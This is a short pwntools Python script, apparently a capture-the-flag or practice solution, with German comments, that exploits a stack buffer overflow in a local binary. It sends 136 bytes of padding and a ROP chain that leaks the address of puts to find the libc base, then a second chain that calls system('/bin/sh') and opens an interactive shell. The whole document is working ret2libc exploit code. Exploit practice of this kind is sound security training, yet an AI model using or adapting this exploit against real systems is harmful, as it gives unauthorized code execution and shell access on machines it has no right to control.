from pwn import *

elf = context.binary = ELF('./AAAAAAAA')
libc = elf.libc

p = process()
#pid = util.proc.pidof(p)[0]
#print(f"Pid is: {pid}")
#util.proc.wait_for_debugger(pid)
p.recvuntil(b"bin/sh\n")
POP_RDI = 0x401203
RET = 0x40101a

#p.recvline()

got_puts = elf.got['puts']      # hol die puts Adresse aus der got Tabelle
plt_puts = elf.plt['puts']      # hol die puts Adresse aus der plt section
main = elf.sym['main']          # hol die main Adresse

payload = flat(
    'A' * 136,
    POP_RDI,
    got_puts,
    plt_puts,
    main,                       # Damit das Programm nicht beendet wird, nochmals main aufrufen
)

p.sendline(payload)

puts_leak = u64(p.recv(6) + b'\x00\x00')        # Brauchen nicht alles sondern nur die puts Adresse
p.recvlines(2)
libc.address = puts_leak - libc.sym['puts']     # Berechne die libc Adresse anhand von puts Adresse
log.success(f'LIBC base: {hex(libc.address)}')
log.success(f'PLT: {hex(plt_puts)}')
log.success(f'GOT: {hex(got_puts)}')
log.success(f'MAIN: {hex(main)}')
log.success(f'PUTS_LEAK: {hex(puts_leak)}')

payload = flat(
    'A' * 136,                              # Padding
    RET,                                    # RET Gadget wird für Stack Alignment gebraucht
    POP_RDI,                                # pop rdi; ret Gadget
    next(libc.search(b'/bin/sh\x00')),      # Suche nach /bin/sh Adresse in der libc-Bibliothek
    libc.sym['system'],                     # Suche nach system() Adresse in der libc-Ninliothek
    libc.sym['exit'],                       # führe exit() aus
)

p.sendline(payload)

p.interactive()
